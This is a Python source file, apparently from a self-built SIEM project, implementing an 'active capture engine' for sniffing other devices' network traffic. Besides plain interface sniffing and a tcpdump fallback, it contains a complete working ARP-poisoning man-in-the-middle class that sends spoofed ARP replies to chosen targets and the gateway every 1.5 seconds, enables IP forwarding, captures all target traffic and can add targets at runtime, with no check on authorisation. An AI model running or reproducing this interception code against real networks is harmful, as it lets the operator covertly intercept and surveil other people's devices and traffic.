"""
CyberRemedy SIEM — Active Capture Engine
=========================================
Active method to capture traffic from other devices on the network.

WHY ACTIVE BEATS PASSIVE FOR MOST SETUPS
-----------------------------------------
Passive monitor mode (wlan1mon) can ONLY see:
  - Unencrypted 802.11 frames (open WiFi only)
  - Management/beacon frames on the locked channel
  - Traffic on ONE channel at a time
  - Nothing on WPA2/WPA3 networks (payload is encrypted at radio layer)

Active capture works on ANY network (WPA2, WPA3, wired) by:
  METHOD 1 — Interface capture (wlan0 / eth0):
    Sniff all packets that pass through this machine's NIC.
    Catches: broadcast/multicast, traffic TO/FROM this machine,
             and ALL traffic when MITM is active.

  METHOD 2 — ARP MITM + active sniff (best coverage):
    ARP-poison a target → its traffic routes THROUGH this machine.
    We capture it on wlan0 before/after IP forwarding.
    Catches: ALL unicast traffic from target (including HTTPS metadata,
             DNS, port usage, destination IPs) even on encrypted WiFi.

  METHOD 3 — tcpdump subprocess (fallback, no scapy needed):
    Spawns tcpdump -i wlan0 -w - and reads raw pcap from stdout pipe.
    Works even if scapy is not installed.

INTEGRATION
-----------
ActiveCaptureEngine is added to SIEMManager._startup_thread() alongside
(or instead of) MonitorSniffer. Both produce the same packet dict schema
so they plug into the same FlowAggregator / detector pipeline.

The manager decides which engine to run based on config:
  siem:
    capture_mode: auto      # auto | passive | active | both
    active_iface: wlan0     # interface for active capture
    active_targets: []      # IPs to MITM; empty = capture all local traffic
    active_bpf: ""          # optional BPF filter e.g. "not port 22"
"""

import ipaddress
import logging
import os
import queue
import subprocess
import struct
import threading
import time
from collections import defaultdict, deque
from datetime import datetime, timezone
from typing import Callable, List, Optional

logger = logging.getLogger("cyberremedy.siem.active")

# Scapy is optional — we fall back to tcpdump subprocess if unavailable
try:
    from scapy.all import (
        sniff, IP, IPv6, TCP, UDP, ICMP, DNS, ARP,
        Ether, sendp, srp, get_if_hwaddr, conf as scapy_conf
    )
    scapy_conf.verb = 0
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False
    logger.warning("[ACTIVE] scapy not installed — will use tcpdump fallback")


# ---------------------------------------------------------------------------
# Packet normaliser  (same schema as capture/sniffer.py normalize_packet)
# ---------------------------------------------------------------------------

def _normalise(pkt) -> Optional[dict]:
    """Extract IP-layer info from a scapy packet into the standard schema."""
    if not SCAPY_OK:
        return None
    try:
        ip_layer = None
        if pkt.haslayer(IP):
            ip_layer = pkt[IP]
        elif pkt.haslayer(IPv6):
            ip_layer = pkt[IPv6]
        if ip_layer is None:
            return None

        src_ip = str(ip_layer.src)
        dst_ip = str(ip_layer.dst)

        # Drop multicast / broadcast. Keep link-local (needed for IPv6 NDP visibility)
        try:
            sa = ipaddress.ip_address(src_ip)
            da = ipaddress.ip_address(dst_ip)
            if sa.is_multicast or da.is_multicast:
                return None
            if sa.version == 4 and (sa.is_unspecified or str(sa) == "255.255.255.255"):
                return None
        except ValueError:
            return None

        protocol = "OTHER"
        src_port = dst_port = 0
        flags = ""

        if pkt.haslayer(TCP):
            protocol = "TCP"
            src_port = pkt[TCP].sport
            dst_port = pkt[TCP].dport
            flags = str(pkt[TCP].flags)
        elif pkt.haslayer(UDP):
            src_port = pkt[UDP].sport
            dst_port = pkt[UDP].dport
            protocol = "DNS" if pkt.haslayer(DNS) else "UDP"
        elif pkt.haslayer(ICMP):
            protocol = "ICMP"

        payload = b""
        try:
            payload = bytes(pkt.payload.payload)
        except Exception:
            pass

        return {
            "timestamp":   datetime.now(tz=timezone.utc).isoformat(),
            "src_ip":      src_ip,
            "dst_ip":      dst_ip,
            "src_port":    src_port,
            "dst_port":    dst_port,
            "protocol":    protocol,
            "length":      len(pkt),
            "payload_len": len(payload),
            "ttl":         getattr(ip_layer, "ttl", 64),
            "flags":       flags,
            "payload":     payload,
            "raw_ts":      time.time(),
            "source":      "siem_active",
        }
    except Exception:
        return None


def _normalise_raw(raw: bytes, ts: float) -> Optional[dict]:
    """
    Parse a raw IP packet (no Ethernet header) captured by tcpdump -i any.
    Used in the tcpdump fallback path.
    """
    try:
        if len(raw) < 20:
            return None
        version = (raw[0] >> 4)
        if version != 4:
            return None  # skip IPv6 for simplicity

        ihl = (raw[0] & 0x0F) * 4
        proto_num = raw[9]
        src_ip = ".".join(str(b) for b in raw[12:16])
        dst_ip = ".".join(str(b) for b in raw[16:20])

        protocol = "OTHER"
        src_port = dst_port = 0
        flags = ""

        if proto_num == 6 and len(raw) >= ihl + 14:   # TCP
            protocol = "TCP"
            src_port = struct.unpack("!H", raw[ihl:ihl+2])[0]
            dst_port = struct.unpack("!H", raw[ihl+2:ihl+4])[0]
            flag_byte = raw[ihl + 13]
            flag_map = {0x01:"F",0x02:"S",0x04:"R",0x08:"P",0x10:"A",0x20:"U"}
            flags = "".join(v for k, v in flag_map.items() if flag_byte & k)
        elif proto_num == 17 and len(raw) >= ihl + 4:  # UDP
            src_port = struct.unpack("!H", raw[ihl:ihl+2])[0]
            dst_port = struct.unpack("!H", raw[ihl+2:ihl+4])[0]
            protocol = "DNS" if dst_port == 53 or src_port == 53 else "UDP"
        elif proto_num == 1:                            # ICMP
            protocol = "ICMP"

        try:
            sa = ipaddress.ip_address(src_ip)
            da = ipaddress.ip_address(dst_ip)
            if sa.is_multicast or da.is_multicast:
                return None
        except ValueError:
            return None

        return {
            "timestamp": datetime.fromtimestamp(ts, tz=timezone.utc).isoformat(),
            "src_ip":    src_ip,
            "dst_ip":    dst_ip,
            "src_port":  src_port,
            "dst_port":  dst_port,
            "protocol":  protocol,
            "length":    len(raw),
            "payload_len": max(0, len(raw) - ihl - 8),
            "ttl":       raw[8],
            "flags":     flags,
            "payload":   b"",
            "raw_ts":    ts,
            "source":    "siem_active_tcpdump",
        }
    except Exception:
        return None


# ---------------------------------------------------------------------------
# METHOD 1 — Scapy sniff on wlan0 (active interface capture)
# ---------------------------------------------------------------------------

class ActiveInterfaceSniffer:
    """
    Sniff directly on the connected interface (wlan0/eth0).
    Captures broadcast, multicast, and all traffic to/from this machine.
    When combined with MITM, captures ALL target device traffic.
    """

    def __init__(
        self,
        iface: str,
        packet_callback: Optional[Callable] = None,
        bpf_filter: str = "",
        target_ips: Optional[List[str]] = None,
    ):
        self._iface     = iface
        self._pkt_cb    = packet_callback
        self._bpf       = bpf_filter or ""
        self._targets   = set(target_ips or [])
        self._running   = threading.Event()
        self._thread    = threading.Thread(
            target=self._run, daemon=True, name="active-sniffer"
        )
        self._count     = 0
        self._dropped   = 0

    def start(self) -> None:
        if not SCAPY_OK:
            logger.error("[ACTIVE] scapy not available — cannot start ActiveInterfaceSniffer")
            return
        self._running.set()
        self._thread.start()
        logger.info(
            f"[ACTIVE] ActiveInterfaceSniffer started on '{self._iface}' "
            f"filter='{self._bpf or 'none'}' "
            f"targets={list(self._targets) or 'all'}"
        )

    def stop(self) -> None:
        self._running.clear()
        logger.info(
            f"[ACTIVE] ActiveInterfaceSniffer stopped — "
            f"{self._count} captured, {self._dropped} dropped"
        )

    @property
    def is_running(self) -> bool:
        return self._running.is_set()

    @property
    def packet_count(self) -> int:
        return self._count

    def _run(self) -> None:
        try:
            sniff(
                iface=self._iface,
                filter=self._bpf or None,
                prn=self._handle,
                store=False,
                stop_filter=lambda _: not self._running.is_set(),
            )
        except OSError as exc:
            logger.error(
                f"[ACTIVE] Cannot open '{self._iface}': {exc}. "
                "Make sure the interface exists and CyberRemedy runs as root."
            )
        except Exception as exc:
            logger.error(f"[ACTIVE] Sniffer crashed: {exc}", exc_info=True)

    def _handle(self, pkt) -> None:
        try:
            info = _normalise(pkt)
            if info is None:
                return
            # If target filter is set, only pass traffic from/to those IPs
            if self._targets:
                if info["src_ip"] not in self._targets and \
                   info["dst_ip"] not in self._targets:
                    self._dropped += 1
                    return
            self._count += 1
            if self._pkt_cb:
                self._pkt_cb(info)
        except Exception as exc:
            logger.debug(f"[ACTIVE] _handle error: {exc}")


# ---------------------------------------------------------------------------
# METHOD 2 — ARP MITM + active sniff (highest coverage)
# ---------------------------------------------------------------------------

class ActiveMITMSniffer:
    """
    Full active capture engine:
      1. ARP-poisons one or more target devices
      2. Sniffs the connected interface (wlan0) to see all their traffic
      3. Re-injects packets so targets don't lose connectivity

    This captures EVERY packet from the target including:
      - All TCP/UDP flows (plaintext metadata even for HTTPS)
      - DNS queries and responses
      - All destination IPs and port usage
      - Traffic volume and timing patterns

    On WPA2/WPA3 WiFi this is far more effective than passive monitor mode
    because the WiFi encryption is between the device and AP only — once
    traffic reaches the IP layer (which MITM operates on) it's visible.
    """

    def __init__(
        self,
        iface: str,
        target_ips: List[str],
        gateway_ip: str = "",
        packet_callback: Optional[Callable] = None,
        alert_callback: Optional[Callable] = None,
        bpf_filter: str = "",
    ):
        self._iface      = iface
        self._targets    = list(target_ips)
        self._gateway_ip = gateway_ip or self._detect_gateway()
        self._pkt_cb     = packet_callback
        self._alert_cb   = alert_callback
        self._bpf        = bpf_filter

        self._running       = threading.Event()
        self._poison_thread = None
        self._sniff_thread  = None

        self._my_mac        = ""
        self._target_macs   = {}   # ip → mac
        self._gateway_mac   = ""

        self._count         = 0
        self._arp_sent      = 0
        self._error         = ""

        self._packets: deque = deque(maxlen=1000)
        self._stats   = defaultdict(int)

    # ── lifecycle ─────────────────────────────────────────────────────────────

    def start(self) -> dict:
        if not SCAPY_OK:
            return {"ok": False, "error": "scapy not installed — pip install scapy"}
        if os.geteuid() != 0:
            return {"ok": False, "error": "Active MITM requires root — sudo python3 main.py"}
        if not self._gateway_ip:
            return {"ok": False, "error": "Cannot detect gateway IP — set siem.gateway_ip in config"}
        if not self._targets:
            return {"ok": False, "error": "No target IPs specified"}

        try:
            self._my_mac     = get_if_hwaddr(self._iface)
            self._gateway_mac = self._resolve_mac(self._gateway_ip)
            if not self._gateway_mac:
                return {"ok": False, "error": f"Cannot resolve gateway MAC ({self._gateway_ip}) — is it online?"}

            for ip in self._targets:
                mac = self._resolve_mac(ip)
                if mac:
                    self._target_macs[ip] = mac
                    logger.info(f"[ACTIVE] Target {ip} → MAC {mac}")
                else:
                    logger.warning(f"[ACTIVE] Cannot resolve MAC for {ip} — skipping")

            if not self._target_macs:
                return {"ok": False, "error": "None of the target IPs responded to ARP — are they online?"}

            self._enable_ip_forwarding()
            self._running.set()

            self._poison_thread = threading.Thread(
                target=self._poison_loop, daemon=True, name="active-arp-poison"
            )
            self._sniff_thread = threading.Thread(
                target=self._sniff_loop, daemon=True, name="active-mitm-sniff"
            )
            self._poison_thread.start()
            self._sniff_thread.start()

            logger.info(
                f"[ACTIVE] MITM active on '{self._iface}' — "
                f"targets: {list(self._target_macs.keys())} "
                f"gateway: {self._gateway_ip}"
            )
            return {
                "ok": True,
                "iface": self._iface,
                "targets": list(self._target_macs.keys()),
                "gateway": self._gateway_ip,
            }

        except Exception as exc:
            self._error = str(exc)
            logger.error(f"[ACTIVE] MITM start failed: {exc}", exc_info=True)
            return {"ok": False, "error": str(exc)}

    def stop(self) -> None:
        if not self._running.is_set():
            return
        logger.info("[ACTIVE] Stopping MITM sniffer — restoring ARP ...")
        self._running.clear()
        self._restore_arp()
        self._disable_ip_forwarding()
        logger.info(
            f"[ACTIVE] MITM stopped — "
            f"{self._count} packets captured, "
            f"{self._arp_sent} ARP packets sent"
        )

    @property
    def is_running(self) -> bool:
        return self._running.is_set()

    @property
    def packet_count(self) -> int:
        return self._count

    def get_packets(self, limit: int = 100) -> list:
        return list(self._packets)[-limit:]

    def status(self) -> dict:
        return {
            "running":      self._running.is_set(),
            "iface":        self._iface,
            "targets":      list(self._target_macs.keys()),
            "gateway_ip":   self._gateway_ip,
            "my_mac":       self._my_mac,
            "gateway_mac":  self._gateway_mac,
            "target_macs":  self._target_macs,
            "packet_count": self._count,
            "arp_sent":     self._arp_sent,
            "error":        self._error,
            "stats":        dict(self._stats),
        }

    # ── ARP poisoning loop ────────────────────────────────────────────────────

    def _poison_loop(self) -> None:
        """Send spoofed ARP replies every 1.5s to all targets + gateway."""
        try:
            while self._running.is_set():
                for tgt_ip, tgt_mac in list(self._target_macs.items()):
                    try:
                        # Tell target: "gateway is at MY MAC"
                        sendp(
                            Ether(dst=tgt_mac) /
                            ARP(op=2,
                                pdst=tgt_ip, hwdst=tgt_mac,
                                psrc=self._gateway_ip, hwsrc=self._my_mac),
                            iface=self._iface, verbose=False,
                        )
                        # Tell gateway: "target is at MY MAC"
                        sendp(
                            Ether(dst=self._gateway_mac) /
                            ARP(op=2,
                                pdst=self._gateway_ip, hwdst=self._gateway_mac,
                                psrc=tgt_ip, hwsrc=self._my_mac),
                            iface=self._iface, verbose=False,
                        )
                        self._arp_sent += 2
                    except Exception as exc:
                        logger.debug(f"[ACTIVE] ARP send error for {tgt_ip}: {exc}")
                time.sleep(1.5)
        except Exception as exc:
            self._error = str(exc)
            logger.error(f"[ACTIVE] Poison loop crashed: {exc}")

    # ── Sniff loop ─────────────────────────────────────────────────────────────

    def _sniff_loop(self) -> None:
        """Sniff the connected interface — sees all forwarded target traffic."""
        target_set = set(self._target_macs.keys())

        def _handle(pkt):
            try:
                info = _normalise(pkt)
                if info is None:
                    return
                src, dst = info["src_ip"], info["dst_ip"]
                if src not in target_set and dst not in target_set:
                    return
                info["source"] = "siem_active_mitm"
                info["mitm_intercepted"] = True
                self._count += 1
                self._packets.append(info)
                self._stats[info["protocol"]] = self._stats.get(info["protocol"], 0) + 1
                self._stats["total"] = self._stats.get("total", 0) + 1
                if self._pkt_cb:
                    self._pkt_cb(info)
            except Exception as exc:
                logger.debug(f"[ACTIVE] sniff handle error: {exc}")

        try:
            # Build BPF to only capture target traffic — much more efficient
            target_bpf = " or ".join(f"host {ip}" for ip in target_set)
            combined_bpf = (
                f"({target_bpf}) and ({self._bpf})"
                if self._bpf else target_bpf
            )
            sniff(
                iface=self._iface,
                filter=combined_bpf,
                prn=_handle,
                store=False,
                stop_filter=lambda _: not self._running.is_set(),
            )
        except Exception as exc:
            self._error = str(exc)
            logger.error(f"[ACTIVE] Sniff loop crashed: {exc}", exc_info=True)

    # ── ARP restore ───────────────────────────────────────────────────────────

    def _restore_arp(self) -> None:
        """Send correct ARP replies to clean up poisoned caches."""
        if not SCAPY_OK:
            return
        try:
            for _ in range(5):
                for tgt_ip, tgt_mac in self._target_macs.items():
                    sendp(
                        Ether(dst=tgt_mac) /
                        ARP(op=2,
                            pdst=tgt_ip, hwdst=tgt_mac,
                            psrc=self._gateway_ip, hwsrc=self._gateway_mac),
                        iface=self._iface, verbose=False,
                    )
                    sendp(
                        Ether(dst=self._gateway_mac) /
                        ARP(op=2,
                            pdst=self._gateway_ip, hwdst=self._gateway_mac,
                            psrc=tgt_ip, hwsrc=tgt_mac),
                        iface=self._iface, verbose=False,
                    )
                time.sleep(0.2)
            logger.info("[ACTIVE] ARP tables restored")
        except Exception as exc:
            logger.warning(f"[ACTIVE] ARP restore error: {exc}")

    # ── helpers ───────────────────────────────────────────────────────────────

    def _resolve_mac(self, ip: str, retries: int = 3) -> str:
        """ARP request to get MAC for an IP. Retries on failure."""
        for attempt in range(retries):
            try:
                ans, _ = srp(
                    Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                    iface=self._iface,
                    timeout=2,
                    verbose=False,
                )
                if ans:
                    mac = ans[0][1].hwsrc
                    return mac
            except Exception as exc:
                logger.debug(f"[ACTIVE] MAC resolve attempt {attempt+1} for {ip}: {exc}")
            time.sleep(0.5)
        return ""

    @staticmethod
    def _detect_gateway() -> str:
        try:
            with open("/proc/net/route") as f:
                for line in f.readlines()[1:]:
                    parts = line.strip().split()
                    if len(parts) >= 3 and parts[1] == "00000000":
                        gw_bytes = bytes.fromhex(parts[2])[::-1]
                        return ".".join(str(b) for b in gw_bytes)
        except Exception:
            pass
        return ""

    @staticmethod
    def _enable_ip_forwarding() -> None:
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1\n")
            logger.info("[ACTIVE] IP forwarding enabled")
        except Exception as exc:
            logger.warning(f"[ACTIVE] Could not enable IP forwarding: {exc}")

    @staticmethod
    def _disable_ip_forwarding() -> None:
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("0\n")
        except Exception:
            pass


# ---------------------------------------------------------------------------
# METHOD 3 — tcpdump subprocess fallback (no scapy needed)
# ---------------------------------------------------------------------------

# libpcap pcap file global header format
_PCAP_GLOBAL_HEADER = struct.Struct("<IHHiIII")
_PCAP_PKT_HEADER    = struct.Struct("<IIII")

class TcpdumpCapture:
    """
    Spawns tcpdump as a subprocess and reads raw pcap from its stdout pipe.
    Fallback when scapy is not available. Also useful for capturing on
    interfaces where scapy has permission issues.

    Produces the same packet dict schema as the scapy-based sniffers.
    """

    def __init__(
        self,
        iface: str,
        packet_callback: Optional[Callable] = None,
        bpf_filter: str = "",
        snaplen: int = 262144,
    ):
        self._iface   = iface
        self._pkt_cb  = packet_callback
        self._bpf     = bpf_filter
        self._snaplen = snaplen

        self._running  = threading.Event()
        self._thread   = threading.Thread(
            target=self._run, daemon=True, name="active-tcpdump"
        )
        self._proc     = None
        self._count    = 0
        self._error    = ""

    def start(self) -> None:
        self._running.set()
        self._thread.start()
        logger.info(
            f"[ACTIVE] TcpdumpCapture started on '{self._iface}' "
            f"filter='{self._bpf or 'none'}'"
        )

    def stop(self) -> None:
        self._running.clear()
        if self._proc:
            try:
                self._proc.terminate()
            except Exception:
                pass
        logger.info(f"[ACTIVE] TcpdumpCapture stopped — {self._count} packets")

    @property
    def is_running(self) -> bool:
        return self._running.is_set()

    @property
    def packet_count(self) -> int:
        return self._count

    def _run(self) -> None:
        cmd = [
            "tcpdump",
            "-i", self._iface,
            "-w", "-",                 # write pcap to stdout
            "-s", str(self._snaplen),
            "-n",                      # no DNS resolution
            "--immediate-mode",        # flush every packet immediately
        ]
        if self._bpf:
            cmd.append(self._bpf)

        try:
            self._proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                bufsize=0,
            )
        except FileNotFoundError:
            self._error = "tcpdump not found — install: sudo apt install tcpdump"
            logger.error(f"[ACTIVE] {self._error}")
            return
        except Exception as exc:
            self._error = str(exc)
            logger.error(f"[ACTIVE] tcpdump launch failed: {exc}")
            return

        try:
            self._read_pcap_stream(self._proc.stdout)
        except Exception as exc:
            if self._running.is_set():
                self._error = str(exc)
                logger.error(f"[ACTIVE] pcap read error: {exc}")
        finally:
            try:
                self._proc.wait(timeout=3)
            except Exception:
                pass

    def _read_pcap_stream(self, pipe) -> None:
        """Parse raw pcap global header then per-packet records from stdin pipe."""

        def _read_exact(n: int) -> bytes:
            buf = b""
            while len(buf) < n and self._running.is_set():
                chunk = pipe.read(n - len(buf))
                if not chunk:
                    raise EOFError("tcpdump pipe closed")
                buf += chunk
            return buf

        # Global pcap header (24 bytes)
        header_raw = _read_exact(_PCAP_GLOBAL_HEADER.size)
        magic, ver_maj, ver_min, thiszone, sigfigs, snaplen, linktype = \
            _PCAP_GLOBAL_HEADER.unpack(header_raw)

        if magic not in (0xA1B2C3D4, 0xD4C3B2A1):
            raise ValueError(f"Not a pcap stream (magic={hex(magic)})")

        byteswap = (magic == 0xD4C3B2A1)
        # linktype 1 = Ethernet, 101 = raw IP
        is_ethernet = (linktype == 1)

        logger.info(
            f"[ACTIVE] tcpdump pcap stream open — linktype={linktype} "
            f"({'Ethernet' if is_ethernet else 'raw IP'})"
        )

        while self._running.is_set():
            # Per-packet header (16 bytes)
            try:
                pkt_hdr = _read_exact(_PCAP_PKT_HEADER.size)
            except EOFError:
                break

            ts_sec, ts_usec, incl_len, orig_len = _PCAP_PKT_HEADER.unpack(pkt_hdr)
            if byteswap:
                ts_sec   = struct.unpack(">I", struct.pack("<I", ts_sec))[0]
                ts_usec  = struct.unpack(">I", struct.pack("<I", ts_usec))[0]
                incl_len = struct.unpack(">I", struct.pack("<I", incl_len))[0]

            if incl_len > 65535:
                logger.warning(f"[ACTIVE] Suspiciously large packet ({incl_len}B) — skipping")
                continue

            raw = _read_exact(incl_len)
            ts  = ts_sec + ts_usec / 1_000_000

            # Strip Ethernet header if present (14 bytes)
            ip_raw = raw[14:] if is_ethernet else raw

            info = _normalise_raw(ip_raw, ts)
            if info is None:
                continue

            self._count += 1
            if self._pkt_cb:
                try:
                    self._pkt_cb(info)
                except Exception as exc:
                    logger.debug(f"[ACTIVE] callback error: {exc}")


# ---------------------------------------------------------------------------
# ActiveCaptureEngine — unified façade that picks the right method
# ---------------------------------------------------------------------------

class ActiveCaptureEngine:
    """
    Unified active capture engine used by SIEMManager.

    Automatically selects the best available capture method:
      - 'mitm'      : ARP MITM + targeted sniff  (best coverage, needs scapy + root)
      - 'interface' : Direct interface sniff      (good coverage, needs scapy + root)
      - 'tcpdump'   : tcpdump subprocess          (fallback, needs tcpdump installed)

    All methods produce identical packet dicts and plug into the same
    FlowAggregator / SIEMDetector pipeline as the passive MonitorSniffer.
    """

    def __init__(
        self,
        iface: str,
        packet_callback: Optional[Callable] = None,
        alert_callback: Optional[Callable] = None,
        target_ips: Optional[List[str]] = None,
        gateway_ip: str = "",
        bpf_filter: str = "",
        method: str = "auto",   # auto | mitm | interface | tcpdump
    ):
        self._iface    = iface
        self._pkt_cb   = packet_callback
        self._alert_cb = alert_callback
        self._targets  = list(target_ips or [])
        self._gateway  = gateway_ip
        self._bpf      = bpf_filter
        self._method   = method

        self._engine   = None
        self._running  = False
        self._error    = ""

        # Stats
        self.stats = {
            "method":         "",
            "iface":          iface,
            "packet_count":   0,
            "targets":        self._targets,
            "gateway_ip":     gateway_ip,
            "running":        False,
            "error":          "",
        }

    def start(self) -> dict:
        """Start the best available capture method. Returns status dict."""
        method = self._pick_method()
        logger.info(f"[ACTIVE] Starting capture engine — method={method} iface={self._iface}")

        if method == "mitm":
            if not self._targets:
                return {"ok": False, "error": "MITM method requires at least one target IP"}
            engine = ActiveMITMSniffer(
                iface=self._iface,
                target_ips=self._targets,
                gateway_ip=self._gateway,
                packet_callback=self._pkt_cb,
                alert_callback=self._alert_cb,
                bpf_filter=self._bpf,
            )
            result = engine.start()
            if not result["ok"]:
                return result
            self._engine = engine

        elif method == "interface":
            engine = ActiveInterfaceSniffer(
                iface=self._iface,
                packet_callback=self._pkt_cb,
                bpf_filter=self._bpf,
                target_ips=self._targets or None,
            )
            engine.start()
            self._engine = engine
            result = {"ok": True}

        elif method == "tcpdump":
            engine = TcpdumpCapture(
                iface=self._iface,
                packet_callback=self._pkt_cb,
                bpf_filter=self._bpf,
            )
            engine.start()
            self._engine = engine
            result = {"ok": True}

        else:
            return {"ok": False, "error": f"Unknown capture method: {method}"}

        self._running = True
        self._error   = ""
        self.stats.update({
            "method":   method,
            "running":  True,
            "error":    "",
            "targets":  self._targets,
        })

        logger.info(f"[ACTIVE] Capture engine running — method={method}")
        return {**result, "method": method}

    def stop(self) -> None:
        if self._engine:
            try:
                self._engine.stop()
            except Exception as exc:
                logger.warning(f"[ACTIVE] Engine stop error: {exc}")
        self._running = False
        self.stats["running"] = False

    @property
    def is_running(self) -> bool:
        return self._running

    @property
    def packet_count(self) -> int:
        if self._engine and hasattr(self._engine, "packet_count"):
            return self._engine.packet_count
        return 0

    def get_status(self) -> dict:
        base = {**self.stats, "packet_count": self.packet_count}
        if self._engine and hasattr(self._engine, "status"):
            base["engine_detail"] = self._engine.status()
        return base

    def scan_ipv6_neighbours(self) -> list:
        """
        Actively discover IPv6 devices on the network.
        Sends ICMPv6 multicast solicitation and reads the kernel NDP cache.
        Returns list of {"ip": ..., "mac": ...} dicts.
        """
        import subprocess
        neighbours = []
        seen = set()

        # 1. Send ICMPv6 all-nodes multicast ping to populate NDP cache
        try:
            subprocess.run(
                ["ping6", "-c", "3", "-I", self._iface, "ff02::1"],
                capture_output=True, timeout=6
            )
        except Exception:
            pass

        # 2. Read kernel neighbour table
        try:
            out = subprocess.run(
                ["ip", "-6", "neigh", "show"],
                capture_output=True, text=True, timeout=5
            ).stdout
            for line in out.splitlines():
                parts = line.split()
                if len(parts) >= 5 and "lladdr" in parts:
                    ipv6 = parts[0]
                    mac_idx = parts.index("lladdr") + 1
                    mac = parts[mac_idx] if mac_idx < len(parts) else ""
                    state = parts[-1]
                    if mac and state in ("REACHABLE", "STALE", "DELAY", "PROBE")                             and ipv6 not in seen:
                        seen.add(ipv6)
                        neighbours.append({
                            "ip": ipv6, "mac": mac,
                            "state": state, "source": "ndp"
                        })
        except Exception as exc:
            logger.debug(f"[ACTIVE] NDP neighbour read: {exc}")

        logger.info(
            f"[ACTIVE] IPv6 NDP scan complete — "
            f"{len(neighbours)} neighbours found"
        )
        return neighbours

    def add_target(self, ip: str) -> dict:
        """Dynamically add a new MITM target at runtime."""
        if not isinstance(self._engine, ActiveMITMSniffer):
            return {"ok": False, "error": "add_target only works in MITM mode"}
        mac = self._engine._resolve_mac(ip)
        if not mac:
            return {"ok": False, "error": f"Cannot resolve MAC for {ip} — is it online?"}
        self._engine._target_macs[ip] = mac
        if ip not in self._targets:
            self._targets.append(ip)
        logger.info(f"[ACTIVE] Added MITM target {ip} (MAC {mac})")
        return {"ok": True, "ip": ip, "mac": mac}

    def remove_target(self, ip: str) -> dict:
        """Remove a target and restore its ARP cache."""
        if not isinstance(self._engine, ActiveMITMSniffer):
            return {"ok": False, "error": "remove_target only works in MITM mode"}
        if ip not in self._engine._target_macs:
            return {"ok": False, "error": f"{ip} not in active targets"}
        # Restore just this target's ARP
        tgt_mac = self._engine._target_macs.pop(ip)
        if self._engine._gateway_mac and SCAPY_OK:
            try:
                for _ in range(3):
                    sendp(
                        Ether(dst=tgt_mac) /
                        ARP(op=2,
                            pdst=ip, hwdst=tgt_mac,
                            psrc=self._engine._gateway_ip,
                            hwsrc=self._engine._gateway_mac),
                        iface=self._iface, verbose=False,
                    )
                    time.sleep(0.1)
            except Exception:
                pass
        if ip in self._targets:
            self._targets.remove(ip)
        logger.info(f"[ACTIVE] Removed MITM target {ip}, ARP restored")
        return {"ok": True, "removed": ip}

    def _pick_method(self) -> str:
        """Auto-select the best method based on availability and config."""
        if self._method != "auto":
            return self._method

        is_root = (os.geteuid() == 0)

        # MITM is the best if we have targets + scapy + root
        if self._targets and SCAPY_OK and is_root:
            return "mitm"

        # Interface sniff is good for general capture
        if SCAPY_OK and is_root:
            return "interface"

        # tcpdump fallback — needs root but not scapy
        if is_root:
            return "tcpdump"

        # Nothing works without root
        logger.warning(
            "[ACTIVE] Not running as root — active capture is limited. "
            "Restart with: sudo python3 main.py"
        )
        return "tcpdump"  # Will fail gracefully with a clear error message
